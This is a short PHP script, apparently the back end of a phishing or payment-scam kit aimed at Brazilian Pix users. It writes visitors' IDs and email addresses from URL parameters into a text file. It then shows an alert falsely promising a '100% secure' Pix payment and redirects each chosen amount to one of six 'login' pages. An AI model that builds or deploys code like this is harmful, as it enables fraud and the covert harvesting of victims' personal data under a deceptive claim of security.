<?php

$id = isset($_GET['id'])?$_GET['id']:"SEM PARAMENTRO";
$email = isset($_GET['email'])?$_GET['email']:"<h1>SEM PARAMENTRO </h1>";
$selecione = isset($_GET['valor'])?$_GET['valor']:"<h1>SEM PARAMENTRO </h1>";


file_put_contents("emails.txt", "id: " . $id . " Email: " .$email."\n", FILE_APPEND);
if($selecione == "100 R$"){
echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login1.html" /> </head> </html>';

}
if($selecione == "60 R$"){
    echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
    echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login2.html" /> </head> </html>';
}
if($selecione == "40 R$"){
    echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
    echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login3.html" /> </head> </html>';
    
}

if($selecione == "15 R$"){
    echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
    echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login4.html" /> </head> </html>';
}


if($selecione == "7 R$"){
    echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
    echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login5.html" /> </head> </html>';
}

if($selecione == "5 R$"){
    echo "<script>alert('Pagamento Seguro 100% Via Pix')</script>";
    echo '<!DOCTYPE html> <html> <head> <meta http-equiv="Refresh" content="0; url=login6.html" /> </head> </html>';
}
















?>